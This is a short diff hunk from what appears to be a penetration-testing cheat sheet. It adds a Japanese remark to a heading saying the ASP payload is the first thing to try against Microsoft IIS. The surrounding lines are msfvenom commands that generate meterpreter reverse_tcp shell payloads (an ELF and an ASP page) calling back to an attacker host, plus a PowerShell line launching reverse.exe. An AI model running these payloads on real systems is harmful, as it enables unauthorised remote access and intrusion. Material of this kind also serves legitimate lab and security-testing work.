@@ -673,7 +673,7 @@ powershell "Start-Process "reverse.exe"
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
 ```
 
-#### ASP(msfvenom)
+#### ASP(msfvenom)  Microsoft IIS httpd の時、first でこれ考える！
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
